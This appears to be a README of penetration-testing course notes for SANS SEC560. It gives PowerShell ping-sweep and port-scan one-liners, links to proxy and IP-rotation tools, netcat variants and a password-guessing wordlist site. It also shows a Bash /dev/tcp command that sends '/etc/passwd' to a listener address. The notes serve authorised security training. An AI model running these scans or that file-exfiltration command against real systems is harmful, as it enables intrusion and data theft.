# 560-Extras
Notes and other extras related to SANS SEC560

## Day 1


## Day 2


### Other port and host scanning options

RustScan: https://github.com/RustScan/RustScan

How to write a port scanner in Go: https://github.com/jboursiquot/portscan

PowerShell ping sweep example: 1..60 | % {echo $_; ping -n 1 -w 100 10.10.10.$_ | select-string ttl}

PowerShell port scan example: 70..90 | % {echo $_; echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.50",$_)) "Port $_ is open" } 2>$null


### Proxying traffic and rotating source IP
https://github.com/ustayready/fireprox (more for web traffic, but always worth mentioning)

https://github.com/blacklanternsecurity/TREVORproxy

https://github.com/Shellntel/scripts/blob/master/proxyCannon.py


### PktMon - Windows native packet capture

https://learn.microsoft.com/en-us/windows-server/networking/technologies/pktmon/pktmon


### Bash /dev/tcp fun

Connect to a port: echo "" > /dev/tcp/142.250.138.139/443

Send a file: cat /path/to/file > /dev/tcp/ip/port
  ex: cat /etc/passwd > /dev/tcp/10.10.10.10/4444

### All the cats

Powercat: https://github.com/besimorhino/powercat

Nmap's ncat: https://nmap.org/ncat/

pwncat, "python netcat on steroids": https://github.com/cytopia/pwncat

socat: https://linux.die.net/man/1/socat

telnet ip port


### Auto-updated wordlist for pw guessing based on current, relevant seasons, months, and year:

http://weakpasswords.net/


## Day 3

## Day 4

## Day5
